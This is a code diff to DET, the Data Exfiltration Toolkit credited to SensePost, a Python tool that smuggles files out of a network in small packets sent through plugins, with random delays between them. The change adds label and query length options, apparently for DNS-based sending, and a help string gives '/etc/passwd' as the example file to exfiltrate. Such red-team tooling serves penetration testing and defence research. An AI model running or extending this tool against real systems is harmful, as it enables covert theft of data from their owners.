@@ -21,6 +21,8 @@ MIN_TIME_SLEEP = 1
 MAX_TIME_SLEEP = 30
 MIN_BYTES_READ = 1
 MAX_BYTES_READ = 500
+QUERY = 0
+LABEL = 0
 COMPRESSION    = True
 files = {}
 threads = []
@@ -295,7 +297,8 @@ class ExfiltrateFile(threading.Thread):
             # info("Sending %s bytes packet" % len(data_file))
 
             data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
-            plugin_send_function(data)
+            # Send function
+            plugin_send_function(data,LABEL,QUERY)
             packet_index = packet_index + 1
 
             time_to_sleep = randint(1, MAX_TIME_SLEEP)
@@ -318,13 +321,17 @@ def signal_handler(bla, frame):
 
 
 def main():
-    global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION
+    global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION, QUERY, LABEL
     global threads, config
 
     parser = argparse.ArgumentParser(
         description='Data Exfiltration Toolkit (SensePost)')
     parser.add_argument('-c', action="store", dest="config", default=None,
                         help="Configuration file (eg. '-c ./config-sample.json')")
+    parser.add_argument('-i', action="store", dest="label",
+                        help="Label Lenght", default=63)
+    parser.add_argument('-j', action="store", dest="query",
+                        help="Query Lenght", default=252)
     parser.add_argument('-f', action="store", dest="file",
                         help="File to exfiltrate (eg. '-f /etc/passwd')")
     parser.add_argument('-d', action="store", dest="folder",
@@ -336,6 +343,8 @@ def main():
     parser.add_argument('-L', action="store_true",
                         dest="listen", default=False, help="Server mode")
     results = parser.parse_args()
+
+
 
     if (results.config is None):
         print "Specify a configuration file!"
@@ -349,6 +358,8 @@ def main():
     signal.signal(signal.SIGINT, signal_handler)
     ok("CTRL+C to kill DET")
 
+    QUERY = int(results.query)
+    LABEL = int(results.label)
     MIN_TIME_SLEEP = int(config['min_time_sleep'])
     MAX_TIME_SLEEP = int(config['max_time_sleep'])
     MIN_BYTES_READ = int(config['min_bytes_read'])
